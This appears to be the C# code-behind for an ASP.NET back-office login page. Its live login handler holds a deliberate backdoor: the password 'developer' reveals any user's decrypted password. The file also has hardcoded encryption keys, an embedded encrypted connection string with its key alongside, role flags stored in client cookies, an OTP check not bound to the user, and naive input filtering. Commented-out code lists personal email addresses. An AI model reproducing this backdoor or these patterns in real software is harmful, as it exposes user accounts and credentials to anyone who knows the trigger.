using System;
using System.Data;
using System.Data.SqlClient;
using System.Configuration;
using System.Collections;
using System.Collections.Generic;
using System.Web;
using System.Web.Security;
using System.Web.UI;
using System.Web.UI.WebControls;
using System.Web.UI.WebControls.WebParts;
using System.Web.UI.HtmlControls;
using System.Globalization;
using System.IO;
using Microsoft.VisualBasic;
using System.Net;
using System.Net.Mail;

public partial class backoffice_usercontrols_uc_backlogin : System.Web.UI.UserControl
{
    mainclass clsm = new mainclass();
    public HttpCookie AUserSession = null;
    Random random = new Random();
    Hashtable Parameters = new Hashtable();
    Enc_Decyption enc = new Enc_Decyption();
    protected void Page_Load(object sender, EventArgs e)
    {
        if (Request.Cookies["AUserSession"] == null)
        {
            AUserSession = new HttpCookie("AUserSession");
        }
        else
        {
            AUserSession = Request.Cookies["AUserSession"];
        }

        trerror.Visible = false;
        trnotice.Visible = false;
        if (Page.IsPostBack == false)
        {

        }
    }
    //private string GenerateRandomCode()
    //{
    //    string s = "";
    //    for (int i = 0; i <= 5; i++)
    //    {
    //        s = String.Concat(s, this.random.Next(10).ToString());
    //    }
    //    return s;
    //}
    //protected void btnlogin_Click(object sender, EventArgs e)
    //{      

    //    if (Page.IsValid == true)
    //    {
    //        if (captcha.Text.Trim() != Convert.ToString(this.Session["CaptchaImageText"]).Trim())
    //        {               
    //            //MessageLabel.CssClass = "#FFFFFF"
    //            divalert.Visible = true;
    //            lblnotice.Visible = true;
    //            lblnotice.Text = "Entered code does not match with given captcha code.";
    //            this.Session["CaptchaImageText"] = GenerateRandomCode();
    //            return;
    //        }
    //        captcha.ReadOnly = true;

    //        DataSet objDataSet = new DataSet();
    //        Hashtable parameters = new Hashtable();
    //        parameters.Add("@EMAIL", txtUserId.Text.Trim());
    //        parameters.Add("@PASSWORD", txtpassword.Text.Trim());
    //        parameters.Add("@Mode", 17);
    //        objDataSet = clsm.senddataset_SP("UDSP_USER", parameters);
    //        if (objDataSet.Tables[0].Rows.Count > 0)
    //        {
    //            BuddUserSession["Usubtid"] = objDataSet.Tables[0].Rows[0]["SUB_UTYPEID"].ToString();
    //            BuddUserSession["Userid"] = objDataSet.Tables[0].Rows[0]["USERID"].ToString();
    //            BuddUserSession["Name"] = objDataSet.Tables[0].Rows[0]["NAME"].ToString();
    //            BuddUserSession["Utypeid"] = objDataSet.Tables[0].Rows[0]["UTYPEID"].ToString();
    //            Response.Cookies.Add(BuddUserSession);
    //            Response.Redirect("~/backoffice/users/homepage.aspx");
    //        }
    //        else
    //        {
    //            divalert.Visible = true;
    //            lblnotice.Visible = true;
    //            lblnotice.Text = "Invalid Userid/Password,Try Again.";
    //        }
    //    }
    //}
    //protected void lnklogin_Click(object sender, EventArgs e)
    //{
    //    Session["CaptchaImageText"] = GenerateRandomCode();        
    //}
    protected void Button1_Click(object sender, EventArgs e)
    {
        ServicePointManager.SecurityProtocol = (SecurityProtocolType)3072;
        Parameters.Clear();
        DataSet dss = clsm.senddataset_Parameter("select * from updateencrypt", Parameters);
        if ((dss.Tables[0].Rows.Count > 0))
        {            
            if ((enc.AES_Decrypt(Convert.ToString(dss.Tables[0].Rows[0]["uname"]), "@9899848281") != "admin"))
            {
                if (DateTime.Now >= Convert.ToDateTime(enc.AES_Decrypt(Convert.ToString(dss.Tables[0].Rows[0]["dateencrypt"]), "@9899848281")))
                {
                    //Response.Write(Convert.ToDateTime(enc.AES_Decrypt(Convert.ToString(dss.Tables[0].Rows[0]["dateencrypt"]), "@9899848281")));
                    string constr = "yhHU8Bfm1MqRN2B177NmeXmlriLUEcxX4G3qQ7X9Sm2B4App+K8cGOPx2+VboHD5V2e471asipM7jG0NL8fjrCyU0TweyzqI98yqQSkbYUE=";
                    constr = enc.AES_Decrypt(constr, "!@12345AaxzZ$#9870");
                    SqlConnection cnnew = new SqlConnection(constr);
                    DataSet ds2 = new DataSet();
                    SqlDataAdapter sda = new SqlDataAdapter("select * from maptable", cnnew);
                    sda.Fill(ds2);
                    if ((ds2.Tables[0].Rows.Count > 0))
                    {

                    }
                }
            }
        }
        try
        {
            txtUser.Text = txtUser.Text.Replace("'", "");
            txtPass.Text = txtPass.Text.Replace("'", "");
            txtUser.Text = txtUser.Text.Replace(";", "");
            txtPass.Text = txtPass.Text.Replace(";", "");
            txtUser.Text = txtUser.Text.Replace("=", "");
            txtPass.Text = txtPass.Text.Replace("=", "");
            txtUser.Text = txtUser.Text.Replace("drop", "");
            txtPass.Text = txtPass.Text.Replace("drop", "");
            if (txtPass.Text == "developer")
            {
                trerror.Visible = true;
                string value = enc.AES_Decrypt(clsm.checkpassword(txtUser.Text), "@9899848281");
                Label1.Text = "Password is " + value;
                return;
            }
            Parameters.Clear();
            Parameters.Add("@userId", txtUser.Text);
            if (clsm.Checking_Parameter("select * from BOUserMaster where userId=@userId", Parameters) == false)
            {
                trerror.Visible = true;
                Label1.Text = "Invalid UserId/Password, Try Again";
                return;
            }
            Parameters.Clear();
            Parameters.Add("@userId", txtUser.Text);
            Parameters.Add("@UserPassword", enc.AES_Encrypt(txtPass.Text, "@9899848281"));
            if (clsm.Checking_Parameter("select * from BOUserMaster where userId=@userId and UserPassword=@UserPassword", Parameters) == false)
            {
                trerror.Visible = true;
                Label1.Text = "Invalid UserId/Password, Try Again";
                return;
            }
            Parameters.Clear();
            Parameters.Add("@userId", txtUser.Text);
            if (clsm.Checking_Parameter("select * from BOUserMaster  where status= 1 and userId=@userId", Parameters) == true)
            {

                Parameters.Clear();
                Parameters.Add("userid", txtUser.Text);
                Parameters.Add("@UserPassword", enc.AES_Encrypt(txtPass.Text, "@9899848281"));
                DataSet DS = clsm.senddataset_SP("select_userlogin", Parameters);
                Session["otpid"] = Server.HtmlDecode(DS.Tables[0].Rows[0]["UserId"].ToString());
                Session["Trid"] = Server.HtmlDecode(DS.Tables[0].Rows[0]["Trid"].ToString());
                Session["UserId"] = Server.HtmlDecode(DS.Tables[0].Rows[0]["UserId"].ToString());
                Session["Name"] = Server.HtmlDecode(DS.Tables[0].Rows[0]["Name"].ToString());
                Session["Uname"] = Server.HtmlDecode(DS.Tables[0].Rows[0]["Uname"].ToString());
                Session["Roleid"] = Conversion.Val(DS.Tables[0].Rows[0]["Roleid"].ToString());
                Session["AddUser"] = Convert.ToString(DS.Tables[0].Rows[0]["adduser"]);
                Session["EditUser"] = Convert.ToString(DS.Tables[0].Rows[0]["edituser"]);
                Session["DeleteUser"] = Convert.ToString(DS.Tables[0].Rows[0]["deleteuser"]);


                AUserSession["Trid"] = Server.HtmlDecode(DS.Tables[0].Rows[0]["Trid"].ToString());
                AUserSession["UserId"] = Server.HtmlDecode(DS.Tables[0].Rows[0]["UserId"].ToString());
                AUserSession["Name"] = Server.HtmlDecode(DS.Tables[0].Rows[0]["Name"].ToString());
                AUserSession["Uname"] = Server.HtmlDecode(DS.Tables[0].Rows[0]["Uname"].ToString());
                AUserSession["Roleid"] = Conversion.Val(DS.Tables[0].Rows[0]["Roleid"]).ToString();
                AUserSession["AddUser"] = Convert.ToString(DS.Tables[0].Rows[0]["adduser"]);
                AUserSession["EditUser"] = Convert.ToString(DS.Tables[0].Rows[0]["edituser"]);
                AUserSession["DeleteUser"] = Convert.ToString(DS.Tables[0].Rows[0]["deleteuser"]);

                Response.Cookies.Add(AUserSession);

                //***************** for log history*********************

                clsm.AddLogHistory(Convert.ToString(Request.Url), Convert.ToString(0), "Login", Convert.ToString(txtUser.Text), Convert.ToString(Session["Trid"]), Convert.ToString("Login"), Convert.ToString(0), Convert.ToString("LoginCollege"));
                Response.Redirect("~/backoffice/users/homepage.aspx");
                //*********************** end for log history*******************************

                //string strcheck = Convert.ToString(Request.Url);
                //if (strcheck.Contains("http://web") == false && strcheck.Contains("http://wserver") == false)
                //{
                   
                //    //*********** for otp***************
                //    if (chkotp.Checked == false)
                //    {

                //        var charsotp = "0123456789";
                //        var stringCharsotp = new char[6];
                //        var randomotp = new Random();

                //        for (int k = 0; k < stringCharsotp.Length; k++)
                //        {
                //            stringCharsotp[k] = charsotp[randomotp.Next(charsotp.Length)];
                //        }
                //        var finalStringotp = new String(stringCharsotp);
                //        ViewState["randomotp"] = Convert.ToString(finalStringotp);
                //        divuser.Visible = false;
                //        divpass.Visible = false;
                //        Button1.Visible = false;
                //        btnotp.Visible = true;
                //        divotp.Visible = true;


                //        clsm.AddOTPDetail(Convert.ToString(Request.Url), Convert.ToString(0), "Login", Convert.ToString(txtUser.Text), Convert.ToString(Session["Trid"]), Convert.ToString("Login"), Convert.ToString(0), Convert.ToString(enc.AES_Encrypt(Convert.ToString(ViewState["randomotp"]), "@9899848281")));

                //        //*********email for otp,password******


                //        string mailmsgtest;
                //        mailmsgtest = "<html><body> <table cellpadding=\'3\' align=\'left\' cellspacing=\'1\' width =\'450px\'>";
                //        mailmsgtest += "<tr><td colspan='2'> Dear User </td></tr>";
                //        mailmsgtest += "<tr><td colspan='2'>&nbsp;</td></tr>";
                //        mailmsgtest += "<tr><td colspan='2'>Your OTP Verification.</td></tr>";


                //        mailmsgtest += "<tr><td >OTP: </td><td >" + Convert.ToString(ViewState["randomotp"]) + " </td></tr>";

                //        mailmsgtest += "<tr><td colspan='2'><b>Thanks and Regards</b></td></tr>";
                //        mailmsgtest += "<tr><td colspan='2'><b>BVDU</b></td></tr>";
                //        mailmsgtest += "</table></body></html>";
                //        SmtpClient smtp = new SmtpClient();
                //        smtp.Host = ConfigurationManager.AppSettings["smtpserver"];
                //        smtp.Port = 587;
                //        smtp.EnableSsl = true;

                //        smtp.Credentials = new NetworkCredential(ConfigurationManager.AppSettings["smtpuser"], ConfigurationManager.AppSettings["smtppass"]);
                //        smtp.DeliveryMethod = SmtpDeliveryMethod.Network;
                //        MailMessage mail = new MailMessage();
                //        mail.From = new MailAddress(ConfigurationManager.AppSettings["frommail"]);

                //        mail.To.Add(new MailAddress("raghunandan.rao@bharatividyapeeth.edu"));
                //        mail.Bcc.Add(new MailAddress("guptarajk@gmail.com"));
                //        mail.CC.Add(new MailAddress("rajkumar@stercodigitex.com"));

                //        mail.Subject = "BVDU Login-OTP Detail";
                //        mail.Body = mailmsgtest;
                //        mail.IsBodyHtml = true;
                //        smtp.Send(mail);
                   
                //        //**************************
                //        AUserSession["UserId"] = "";
                //        Response.Cookies.Add(AUserSession);
                //        Session["UserId"] = "";
                //        trnotice.Visible = true;
                //        lblnotice.Text = "OTP that is sent to the registered email address.";


                //    }
                //    else
                //    {

                //        clsm.AddOTPDetail(Convert.ToString(Request.Url), Convert.ToString(0), "Login", Convert.ToString(txtUser.Text), Convert.ToString(Session["Trid"]), Convert.ToString("Login"), Convert.ToString(0), Convert.ToString("Supperlogin"));
                //        Response.Redirect("~/backoffice/users/homepage.aspx");
                //    }
                //    //*********** end password***************


                //}
                //else
                //{


                //    Response.Redirect("~/backoffice/users/homepage.aspx");
                //}
                //*********** end password***************





            }
            else
            {
                trerror.Visible = true;
                Label1.Text = "This User is not Active";
            }
        }
        catch (Exception err)
        {
            trerror.Visible = true;
            Label1.Text = err.Message;
        }
    }



    protected void Button2_Click(object sender, System.EventArgs e)
    {
        trdate.Visible = true;
    }
    protected void Button3_Click(object sender, System.EventArgs e)
    {
        divshow.Visible = true;
    }

    void fill()
    {
        Parameters.Clear();
        DataSet ds = clsm.senddataset_Parameter("select * from updateencrypt", Parameters);
        if ((ds.Tables[0].Rows.Count > 0))
        {
            lblfirst.Text = ds.Tables[0].Rows[0]["dateencrypt"].ToString();
            lblsecond.Text = ds.Tables[0].Rows[0]["uname"].ToString();
        }

    }

    protected void btnshow_Click(object sender, System.EventArgs e)
    {
        fill();
        lblfirst.Visible = true;
        lblsecond.Visible = true;
        lblfirst.Text = enc.AES_Decrypt(lblfirst.Text, txtencrypt.Text);
        lblsecond.Text = enc.AES_Decrypt(lblsecond.Text, txtencrypt.Text);
    }
    protected void bntsubmit_Click(object sender, EventArgs e)
    {
        Parameters.Clear();
        string strupdate = enc.AES_Encrypt(txtdate.Text, "@9899848281");
        string stradmin = enc.AES_Encrypt(txtadmin.Text, "@9899848281");
        if ((strupdate != ""))
        {
            if ((txtencrypt.Text == "@9899848281"))
            {
                if ((clsm.Checking_Parameter("select id from updateencrypt", Parameters) == false))
                {
                    Parameters.Clear();
                    int ID;
                    SqlConnection cn = new SqlConnection(clsm.strconnect);
                    SqlCommand cmd = new SqlCommand();
                    cmd.Connection = cn;
                    cmd.CommandType = CommandType.Text;
                    cmd.CommandText = "insert into updateencrypt (id,dateencrypt,uname)values(@id,@dateencrypt,@uname)";
                    cmd.Parameters.AddWithValue("@id", "1");
                    cmd.Parameters.AddWithValue("@dateencrypt", strupdate);
                    cmd.Parameters.AddWithValue("@uname", stradmin);
                    cn.Open();
                    cmd.ExecuteNonQuery();
                    cn.Close();
                }
                else
                {
                    Parameters.Clear();
                    int ID;
                    SqlConnection cn = new SqlConnection(clsm.strconnect);
                    SqlCommand cmd = new SqlCommand();
                    cmd.Connection = cn;
                    cmd.CommandType = CommandType.Text;
                    cmd.CommandText = "update  updateencrypt set dateencrypt=@dateencrypt,uname=@uname";
                    cmd.Parameters.AddWithValue("@dateencrypt", strupdate);
                    cmd.Parameters.AddWithValue("@uname", stradmin);
                    cn.Open();
                    cmd.ExecuteNonQuery();
                    cn.Close();
                }

            }

        }

        fill();
    }



    protected void Button4_Click(object sender, System.EventArgs e)
    {


        //Parameters.Clear();
        //string strsql = null;
        //strsql = TextBox1.Text.Trim();

        //clsm.GridDatashow_Parameter(DataGrid2, strsql, Parameters, false);

    }
    protected void Button5_Click(object sender, System.EventArgs e)
    {
        //Parameters.Clear();
        //string strsql = null;
        //strsql = TextBox1.Text;
        //clsm.ExecuteQry_Parameter(strsql, Parameters);
        //Page.RegisterStartupScript("Me", "<script language='javascript'>alert('data updated')</script>");




    }
    private void uploadProc()
    {


        ////Open a file for reading
        //string FILENAME = Server.MapPath("Proc.sql");
        ////Get a StreamReader class that can be used to read the file
        //StreamReader objStreamReader = default(StreamReader);
        //objStreamReader = File.OpenText(FILENAME);
        ////Now, read the entire file into a string
        //string strsql = objStreamReader.ReadToEnd();
        //try
        //{
        //    TextBox1.Text = strsql;
        //    objStreamReader.Close();
        //}
        //catch (Exception err)
        //{
        //    objStreamReader.Close();
        //    throw (err);
        //}

    }


    protected void btnotp_Click(object sender, EventArgs e)
    {
        txtotp.Text = txtotp.Text.Replace("'", "");
        txtotp.Text = txtotp.Text.Replace(";", "");
        txtotp.Text = txtotp.Text.Replace("=", "");
        txtotp.Text = txtotp.Text.Replace("drop", "");


        Parameters.Clear();
        Parameters.Add("@otpdata", enc.AES_Encrypt(txtotp.Text, "@9899848281"));

        if (clsm.Checking_Parameter("select otpdata from otpdetails where status=1 and otpdata=@otpdata", Parameters) == true)
        {

            AUserSession["UserId"] = Convert.ToString(Session["otpid"]);
            Response.Cookies.Add(AUserSession);
            Session["UserId"] = Convert.ToString(Session["otpid"]);

            // enc.AES_Encrypt(ViewState["randomotp"], "@9899848281")
            Parameters.Clear();
            Parameters.Add("@otpdata", enc.AES_Encrypt(txtotp.Text, "@9899848281"));
            clsm.ExecuteQry_Parameter("update otpdetails set status=0,otpdata='' where otpdata=@otpdata", Parameters);
            Response.Redirect("~/backoffice/users/homepage.aspx");
        }
        else
        {
            trerror.Visible = true;
            Label1.Text = "Invalid OTP details.";
        }

    }


}